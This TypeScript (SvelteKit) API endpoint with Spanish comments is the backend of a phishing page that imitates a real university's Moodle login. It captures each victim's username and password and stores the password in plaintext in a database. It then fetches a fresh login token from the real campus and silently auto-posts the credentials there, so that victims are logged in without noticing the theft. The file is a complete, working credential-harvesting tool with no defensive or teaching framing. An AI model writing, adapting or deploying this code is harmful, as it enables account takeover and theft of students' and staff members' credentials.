// ------------------------------------------------------------------
// API ENDPOINT — Captura credenciales y auto-envía POST al campus
// ------------------------------------------------------------------
// 1. Guarda usuario/contraseña en Neon.
// 2. Obtiene un logintoken fresco del campus real (Moodle).
// 3. Devuelve una página que auto-envía el POST al campus real,
//    para que la víctima quede autenticada sin sospechar.
// ------------------------------------------------------------------

import type { RequestHandler } from './$types';
import sql from '$lib/server/db';

const CAMPUS_URL = 'https://campus.udv.edu.gt/login/index.php';

export const POST: RequestHandler = async ({ request }) => {
	// --- 1. Leer datos del formulario ---
	const data = await request.formData();
	const username = (data.get('username') ?? '').toString().trim();
	const password = (data.get('password') ?? '').toString();

	// --- 2. Guardar en Neon ---
	try {
		const [user] = await sql`
			INSERT INTO users (username)
			VALUES (${username})
			ON CONFLICT (username) DO NOTHING
			RETURNING id
		`;

		let userId = user?.id;
		if (!userId) {
			const [existing] = await sql`
				SELECT id FROM users WHERE username = ${username}
			`;
			userId = existing.id;
		}

		await sql`
			INSERT INTO user_passwords (user_id, password_hash)
			VALUES (${userId}, ${password})
		`;
	} catch (err) {
		console.error('Error guardando en DB:', err);
	}

	// --- 3. Obtener logintoken fresco del campus real ---
	let logintoken = '';
	try {
		const loginPageRes = await fetch(CAMPUS_URL);
		const html = await loginPageRes.text();
		const match = html.match(
			/<input\s+type="hidden"\s+name="logintoken"\s+value="([^"]+)"/i,
		);
		logintoken = match ? match[1] : '';
	} catch (err) {
		console.error('Error obteniendo logintoken:', err);
	}

	// --- 4. Auto-enviar POST al campus real ---
	// Página totalmente vacía — el form se envía al instante sin que
	// el usuario alcance a ver absolutamente nada.
	if (logintoken) {
		const autoFormHtml = `<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8" /></head>
<body>
<form id="f" action="${CAMPUS_URL}" method="POST">
<input type="hidden" name="logintoken" value="${logintoken}" />
<input type="hidden" name="username" value="${username}" />
<input type="hidden" name="password" value="${password}" />
<input type="hidden" name="anchor" value="" />
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>`;

		return new Response(autoFormHtml, {
			headers: { 'Content-Type': 'text/html; charset=UTF-8' },
		});
	}

	// --- 5. Fallback: redirect normal ---
	return new Response(null, {
		status: 303,
		headers: { Location: CAMPUS_URL },
	});
};
